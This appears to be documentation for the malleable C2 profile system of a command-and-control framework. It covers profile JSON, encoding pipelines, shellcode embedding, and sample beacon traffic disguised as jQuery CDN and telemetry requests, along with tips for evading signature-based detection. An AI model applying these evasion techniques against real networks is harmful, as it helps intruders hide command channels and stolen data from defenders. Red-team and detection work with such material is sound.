# Malleable C2 Profiles

NoNameAx uses a **malleable C2 profile** system that controls how the beacon and teamserver encode, place, and wrap all HTTP traffic. A single JSON profile defines every aspect of network communication -- URIs, headers, cookies, body templates, encoding formats, and error pages -- so that C2 traffic blends with legitimate services like jQuery CDNs, AWS CloudFront, or Microsoft Graph API.

Profiles are loaded at three points in the lifecycle:

1. **Build time** -- profile bytes are embedded into the beacon shellcode via PIC-safe macros
2. **Registration** -- the server sends a `PROFILE` wire frame (0x82) when the beacon first checks in
3. **Runtime** -- operators push a replacement profile to a live beacon with the `profile` command (0x30)

---

## Profile JSON Format

Profiles live in the `profiles/` directory. The top-level structure is a `callbacks` array, where each entry defines a complete C2 callback configuration. Currently only the first callback entry is used.

```
profiles/
  jquery-stealth.json     # jQuery CDN impersonation
  aws-cloudfront.json     # AWS CloudFront/S3 impersonation
  ms365-graph.json        # Microsoft 365 Graph API impersonation
```

### Top-Level Schema

```json
{
  "callbacks": [
    {
      "hosts":            ["<host:port>", ...],
      "user_agent":       "<User-Agent string>",
      "beacon_id_header": "<header name for beacon ID>",
      "rotation":         "sequential | random",
      "server_error":     { ... },
      "get":              { ... },
      "post":             { ... }
    }
  ]
}
```

| Field | Type | Description |
|-------|------|-------------|
| `hosts` | string array | Callback host:port targets. Max 4 entries. |
| `user_agent` | string | HTTP User-Agent header (max 256 chars). |
| `beacon_id_header` | string | Header name used to carry the agent session ID on every request. Default: `X-Beacon-Id`. |
| `rotation` | string | URI rotation strategy: `"sequential"` cycles through URIs in order, `"random"` picks one at random each callback. |
| `server_error` | object | Custom error page returned to scanners and non-beacon requests. |
| `get` | object | HTTP GET transaction config (heartbeat / check-in). |
| `post` | object | HTTP POST transaction config (task results). |

### Server Error Block

Returned for any request that does not match a valid beacon check-in.

```json
"server_error": {
  "status": 404,
  "body": "<!DOCTYPE html>...",
  "headers": {
    "Content-Type": "text/html",
    "Server": "nginx/1.24.0"
  }
}
```

---

## HTTP Transactions

Each transaction (GET and POST) has the same structural layout but different purposes:

- **GET** = heartbeat. The beacon checks in, identifies itself, and retrieves pending tasks.
- **POST** = results. The beacon sends command output back to the server.

```json
"get": {
  "uri":    ["/jquery-3.3.1.min.js", "/assets/js/analytics.js", "/static/bundle.js"],
  "client": { ... },
  "server": { ... }
}
```

### Transaction Schema

| Field | Type | Description |
|-------|------|-------------|
| `uri` | string array | URI paths rotated per the top-level `rotation` setting. Max 8 entries, each max 128 chars. |
| `client` | object | Controls what the beacon sends (request-side encoding). |
| `server` | object | Controls what the teamserver returns (response-side encoding). |

---

## Client Config

The `client` block controls how the beacon constructs its outbound HTTP request.

```json
"client": {
  "headers":    { "Accept": "text/html", "Referer": "https://www.google.com/" },
  "metadata":   { ... },
  "output":     { ... },
  "parameters": { "v": "3.3.1" }
}
```

| Field | Applies To | Description |
|-------|-----------|-------------|
| `headers` | GET, POST | Static HTTP headers added to every request. Max 8 entries. |
| `metadata` | GET, POST | How the beacon embeds its session ID (or encrypted metadata). |
| `output` | POST only | How command results are encoded in the POST body. |
| `parameters` | GET only | Static query string parameters appended to the URI. |

---

## OutputConfig

`OutputConfig` is the core encoding primitive used by `metadata`, `output` (client), and `output` (server). It defines a pipeline of transformations applied to raw data before it is placed into the HTTP message.

### OutputConfig Fields

```json
{
  "format":    "raw | base64 | base64url | hex",
  "mask":      true,
  "placement": "header | cookie | parameter | body",
  "name":      "__cfduid",
  "prepend":   "{\"status\":\"ok\",\"telemetry\":\"",
  "append":    "\",\"version\":\"2.1.0\"}"
}
```

| Field | Type | Description |
|-------|------|-------------|
| `format` | string | Encoding format applied to the data. |
| `mask` | bool | When `true`, applies a 4-byte random XOR key before format encoding. Wire format: `key[4] \|\| xor(data, key)`. |
| `placement` | string | Where the encoded result is placed in the HTTP message. |
| `name` | string | Name of the header, cookie, or query parameter (ignored for `body` placement). |
| `prepend` | string | Static string prepended to the encoded data before placement. |
| `append` | string | Static string appended to the encoded data after placement. |
| `empty_response` | string | Server-side only. Returned when there are no pending tasks (instead of encoded empty data). |

### Format Values

| Value | Wire Byte | Description |
|-------|-----------|-------------|
| `raw` | `0x00` | No encoding. Data is placed as-is. |
| `base64` | `0x01` | Standard Base64 (RFC 4648, with padding). |
| `base64url` | `0x02` | URL-safe Base64 (no padding). |
| `hex` | `0x03` | Lowercase hexadecimal. |

### Placement Values

| Value | Wire Byte | Description |
|-------|-----------|-------------|
| `body` | `0x00` | Data placed in the HTTP body. |
| `header` | `0x01` | Data placed as a custom HTTP header value. |
| `cookie` | `0x02` | Data placed as a cookie value (`Cookie: name=value`). |
| `parameter` | `0x03` | Data placed as a URL query parameter (`?name=value`). |

---

## Encoding Pipeline

The encode and decode pipelines are symmetric. Understanding the order of operations is critical for writing profiles that interoperate correctly.

### Encode (outbound -- beacon client or server response)

```
raw_data
    |
    v
[XOR mask?]     -- if mask=true: prepend 4-byte random key, XOR each byte
    |
    v
[format encode] -- base64 / base64url / hex / raw
    |
    v
[prepend/append] -- wrap with static strings
    |
    v
[place]          -- insert into header / cookie / parameter / body
```

### Decode (inbound -- server reading client or beacon reading server)

```
HTTP message
    |
    v
[extract]        -- read from header / cookie / parameter / body
    |
    v
[strip prepend/append] -- remove static wrapper strings
    |
    v
[format decode]  -- base64 / base64url / hex / raw
    |
    v
[XOR unmask?]    -- if mask=true: read 4-byte key prefix, XOR remaining bytes
    |
    v
raw_data
```

Both beacon (C) and teamserver (Go) implement this pipeline independently:

| Component | Encode | Decode |
|-----------|--------|--------|
| **Beacon (C)** | `NaxEncodeData()` in `HttpCodec.c` | `NaxDecodeData()` in `HttpCodec.c` |
| **Teamserver (Go)** | `encodeServerOutput()` in `pl_http_transform.go` | `decodeClientInput()` in `pl_http_transform.go` |

---

## Server Config

The `server` block controls how the teamserver wraps its HTTP response.

```json
"server": {
  "headers": {
    "Content-Type": "application/javascript; charset=utf-8",
    "Cache-Control": "max-age=0, public",
    "Server": "nginx/1.24.0"
  },
  "output": {
    "format":         "base64",
    "mask":           true,
    "placement":      "body",
    "prepend":        "/*! jQuery v3.3.1 ... */\n/* data: ",
    "append":         " */\n});",
    "empty_response": "/*! jQuery v3.3.1 ... minified no-op ... */;"
  }
}
```

The `empty_response` field is important: when the server has no pending tasks for the beacon, it returns this static string verbatim instead of encoding empty data. This lets the response look like a normal (cacheable) JavaScript file even on idle callbacks.

---

## Example: jquery-stealth.json

This profile disguises C2 traffic as requests to a jQuery CDN. Below is a breakdown of how each direction of communication is handled.

### GET (Heartbeat)

```
BEACON REQUEST (every sleep interval):
  GET /jquery-3.3.1.min.js?v=3.3.1 HTTP/1.1
  Host: 192.168.77.128:8080
  User-Agent: Mozilla/5.0 (Windows NT 10.0; ...) Chrome/120.0.0.0
  Accept: text/html,application/xhtml+xml,...
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: https://www.google.com/
  Cookie: __cfduid=<base64(xor_mask(session_id))>
  X-Correlation-Id: <raw beacon ID>

SERVER RESPONSE (tasks pending):
  HTTP/1.1 200 OK
  Content-Type: application/javascript; charset=utf-8
  Cache-Control: max-age=0, public
  X-Content-Type-Options: nosniff
  Server: nginx/1.24.0

  /*! jQuery v3.3.1 | (c) JS Foundation ... */
  !function(e,t){"use strict"; ... o=n.slice;
  /* data: <base64(xor_mask(encrypted_task_data))> */
  });

SERVER RESPONSE (no tasks):
  /*! jQuery v3.3.1 | (c) JS Foundation ... */
  !function(e,t){"use strict";}("undefined"!=typeof window?window:this,...);
```

### POST (Results)

```
BEACON REQUEST (sending command output):
  POST /api/v1/telemetry HTTP/1.1
  Content-Type: application/json
  Accept: application/json
  X-Requested-With: XMLHttpRequest
  X-Request-Id: <base64url(session_id)>
  X-Correlation-Id: <raw beacon ID>

  {"status":"ok","telemetry":"<base64(xor_mask(encrypted_results))>","version":"2.1.0"}

SERVER RESPONSE:
  HTTP/1.1 200 OK
  Content-Type: application/json
  Server: nginx/1.24.0

  {"status":"accepted"}
```

### Error Page (Non-Beacon Requests)

```
HTTP/1.1 404 Not Found
Content-Type: text/html
Server: nginx/1.24.0
Connection: keep-alive

<!DOCTYPE html><html><head><title>404 Not Found</title></head>
<body><center><h1>404 Not Found</h1></center><hr>
<center>nginx/1.24.0</center></body></html>
```

---

## Build-Time Embedding

At build time, the Go agent plugin serializes the profile into a compact binary format and emits two C macros in `Config.h`:

- `NAX_PROFILE_LEN` -- byte count of the serialized profile
- `NAX_PROFILE_WRITE(p)` -- PIC-safe per-byte MOV instructions that write the profile into a buffer

The `NAX_PROFILE_WRITE` macro is included from a separate auto-generated file (`Config_profile.h`) because profiles can be large (1000--2000+ bytes).

```c
/* Config.h (generated by BuildPayload) */
#define NAX_PROFILE_LEN  1669u
#include "Config_profile.h"
```

```c
/* Config_profile.h - auto-generated */
#define NAX_PROFILE_WRITE( p ) do { \
    (p)[  0]=0x02; (p)[  1]=0x01; (p)[  2]=0x11; (p)[  3]=0x00; \
    /* ... 1669 bytes of per-byte assignments ... */ \
} while(0)
```

This approach avoids `.rdata` string pooling -- every byte is an immediate operand in the `.text` section, which is essential for PIC shellcode that has no relocations.

### Binary Wire Format (v2)

The serialized profile follows this binary layout (all integers little-endian):

```
version(1)           = 0x02
rotation(1)          = 0x00 (sequential) | 0x01 (random)
user_agent           = lpstr
beacon_id_header     = lpstr
host_count(2)        = N
  hosts[N]           = lpstr...

server_error:
  err_status(2)
  err_body             = lpstr
  err_hdr_count(2)     = M
    err_headers[M]     = lpstr...

GET block:
  uri_count(2)         = N
    uris[N]            = lpstr...
  client_meta          = OutputConfig
  client_hdr_count(2)  = N
    headers[N]         = lpstr...     (e.g. "Accept: */*")
  client_param_count(2)= N
    params[N]          = lpstr...     (e.g. "v=3.3.1")
  server_output        = OutputConfig
  server_hdr_count(2)  = N
    headers[N]         = lpstr...     (beacon skips these)

POST block:
  uri_count(2)         = N
    uris[N]            = lpstr...
  client_meta          = OutputConfig
  client_output        = OutputConfig
  client_hdr_count(2)  = N
    headers[N]         = lpstr...
  server_output        = OutputConfig
  server_hdr_count(2)  = N
    headers[N]         = lpstr...     (beacon skips these)
```

Where `lpstr` is `length(uint16LE) + bytes` and `OutputConfig` is:

```
format(1)    -- 0=raw, 1=base64, 2=base64url, 3=hex
mask(1)      -- 0=off, 1=on
placement(1) -- 0=body, 1=header, 2=cookie, 3=parameter
name         = lpstr
prepend      = lpstr
append       = lpstr
empty_resp   = lpstr
```

---

## Runtime Profile Switching

Operators can push a new profile to a live beacon using the `profile` command from the Adaptix operator console.

### Workflow

```
Operator                   Teamserver                    Beacon
   |                           |                            |
   |-- profile {file} -------->|                            |
   |                           |-- save to ExtenderData --->|
   |                           |-- CMD_PROFILE (0x30) wire->|
   |                           |                            |-- NaxDecodeProfile()
   |                           |                            |-- reconfigure URIs,
   |                           |                            |   headers, encoding
   |                           |                            |
   |                           |<-- next GET uses new profile
   |                           |-- listener picks up new    |
   |                           |   profile from store       |
```

### Server Side

1. The `profile` command handler (`pl_commands.go`) receives a base64-encoded JSON profile, parses it, and serializes it to the v2 binary wire format.
2. The profile is persisted to the teamserver's `TsExtenderData` store keyed by agent ID so the listener can look it up.
3. A `CMD_PROFILE` (0x30) task is queued for the beacon containing the serialized binary profile.

### Beacon Side

1. The beacon receives the `CMD_PROFILE` task in its normal task processing loop.
2. `NaxDecodeProfile()` in `PackerProfile.c` parses the v2 binary format and populates the `NAX_CONFIG` struct.
3. All subsequent HTTP requests use the new URIs, headers, cookies, encoding, and metadata placement.
4. The rotation indices (`GetUriIdx`, `PostUriIdx`) are reset to zero.

### Listener Side

The listener polls `TsExtenderData` every 5 seconds (`pollProfileStore()`) for updated per-agent profile overrides. When a new profile is detected:

1. The `ProfileConfig` is parsed and stored in a `sync.Map` keyed by agent ID.
2. The previous profile is preserved in a separate map (`agentPrevProfiles`) to handle in-flight requests that may still use the old profile.
3. The global list of known beacon ID header names is rebuilt (`rebuildBeaconIDHeaders()`) so the HTTP handler can identify beacons using any header name -- current or previous.

---

## Beacon-Side Data Structures

The beacon stores all profile data in the `NAX_CONFIG` struct (defined in `Instance.h`):

```c
typedef struct _NAX_OUTPUT_CFG {
    BYTE   Format;            /* NAX_FMT_RAW / BASE64 / BASE64URL / HEX */
    BYTE   Mask;              /* 0 or 1 */
    BYTE   Placement;         /* NAX_PLACE_BODY / HEADER / COOKIE / PARAMETER */
    CHAR   Name[ 128 ];
    CHAR   Prepend[ 512 ];
    UINT16 PrependLen;
    CHAR   Append[ 512 ];
    UINT16 AppendLen;
    CHAR   EmptyResp[ 512 ];
    UINT16 EmptyRespLen;
} NAX_OUTPUT_CFG;
```

Profile fields in `NAX_CONFIG`:

| Field | Type | Max | Description |
|-------|------|-----|-------------|
| `ProfileVersion` | `BYTE` | -- | 1 (legacy) or 2 (current) |
| `Rotation` | `BYTE` | -- | 0=sequential, 1=random |
| `BeaconIdHdr` | `CHAR[128]` | 127 | Session ID header name |
| `HostCount` | `BYTE` | 4 | Number of callback hosts |
| `Hosts` | `CHAR[4][128]` | 4 | Callback host:port strings |
| `UserAgent` | `CHAR[256]` | 255 | HTTP User-Agent |
| `GetUriCount` / `PostUriCount` | `BYTE` | 8 | Number of URIs per transaction |
| `GetUris` / `PostUris` | `CHAR[8][128]` | 8 | URI path strings |
| `GetClientMeta` | `NAX_OUTPUT_CFG` | -- | GET metadata encoding config |
| `PostClientMeta` | `NAX_OUTPUT_CFG` | -- | POST metadata encoding config |
| `PostClientOutput` | `NAX_OUTPUT_CFG` | -- | POST body encoding config |
| `GetServerOutput` | `NAX_OUTPUT_CFG` | -- | GET response decoding config |
| `PostServerOutput` | `NAX_OUTPUT_CFG` | -- | POST response decoding config |
| `GetClientHdrs` | `CHAR[8][256]` | 8 | Extra GET request headers |
| `PostClientHdrs` | `CHAR[8][256]` | 8 | Extra POST request headers |
| `GetClientParams` | `CHAR[8][128]` | 8 | GET query string parameters |

---

## Writing a Custom Profile

### Step-by-Step

1. Copy an existing profile from `profiles/` as a starting point.
2. Choose a service to impersonate (CDN, API, analytics endpoint).
3. Set `hosts` to your redirector or listener addresses.
4. Design the GET transaction to look like a normal page/asset load:
   - Pick URIs that match the impersonated service
   - Place metadata in a cookie or header that the service would normally use
   - Configure server output with realistic prepend/append wrappers
5. Design the POST transaction to look like a telemetry or API call:
   - Use URIs and headers consistent with the impersonated service
   - Wrap the POST body in a JSON or XML template using prepend/append
6. Set `server_error` to match the impersonated web server's 404 page.
7. Test by loading the profile in a listener and checking traffic in a proxy.

### Guidelines

- **Keep prepend/append under 512 bytes each.** The beacon has fixed 512-byte buffers for these fields.
- **Header names max 128 chars, header values max 256 chars.** These are hard limits in the beacon `NAX_CONFIG` struct.
- **Max 8 URIs per transaction, max 4 hosts.** Enforced by the beacon parser.
- **Max 8 extra headers and 8 parameters per transaction.**
- **Use `mask: true` for any field carrying real data.** The 4-byte XOR key adds entropy that prevents signature matching on the encoded payload.
- **Always set `empty_response` on GET server output.** Without it, idle callbacks return encoded empty data, which looks suspicious.
- **Use `base64url` for header/cookie/parameter placements** to avoid characters that break HTTP parsing (e.g., `+`, `/`, `=` in cookies).
- **The `beacon_id_header` must be consistent** between the profile embedded in the beacon and the listener config. Mismatches cause the listener to reject check-ins.

### Validation

The profile is validated at two points:

1. **Build time** -- the Go agent plugin's `BuildPayload` serializes the JSON to binary wire format; malformed JSON or missing required fields cause a build error.
2. **Runtime switch** -- the `profile` command in the operator console parses and validates the JSON before queuing the task. Invalid profiles are rejected before reaching the beacon.

---

## Source File Reference

| File | Language | Role |
|------|----------|------|
| `profiles/*.json` | JSON | Profile definitions |
| `src_server/listener_nonameax_http/pl_http_profile.go` | Go | JSON parsing (v2 callbacks format + flat UI format) |
| `src_server/listener_nonameax_http/pl_http_transform.go` | Go | Encode/decode pipeline, XOR mask, extraction helpers |
| `src_server/listener_nonameax_http/pl_http_profile_store.go` | Go | Per-agent profile override persistence and polling |
| `src_server/listener_nonameax_http/pl_wire.go` | Go | `ProfileConfig` / `OutputConfig` / `HTTPTransaction` struct definitions, binary serialization |
| `src_server/agent_nonameax/pl_commands.go` | Go | `profile` command handler (0x30), wire serialization |
| `src_server/agent_nonameax/pl_profile.go` | Go | Profile store save/delete, `DefaultProfile()` |
| `src_beacon/include/Instance.h` | C | `NAX_OUTPUT_CFG` struct, `NAX_CONFIG` profile fields, format/placement constants |
| `src_beacon/include/Config.h` | C | Generated build config with `NAX_PROFILE_LEN` / `NAX_PROFILE_WRITE` macros |
| `src_beacon/include/Config_profile.h` | C | Auto-generated per-byte profile WRITE macro |
| `src_beacon/include/Wire.h` | C | `NAX_CMD_PROFILE` (0x30), `NAX_WIRE_PROFILE` (0x82) constants |
| `src_beacon/src/Core/PackerProfile.c` | C | Binary profile decoder (`NaxDecodeProfile`), v1 and v2 |
| `src_beacon/src/Transport/HttpCodec.c` | C | `NaxEncodeData` / `NaxDecodeData` pipeline, header builder |
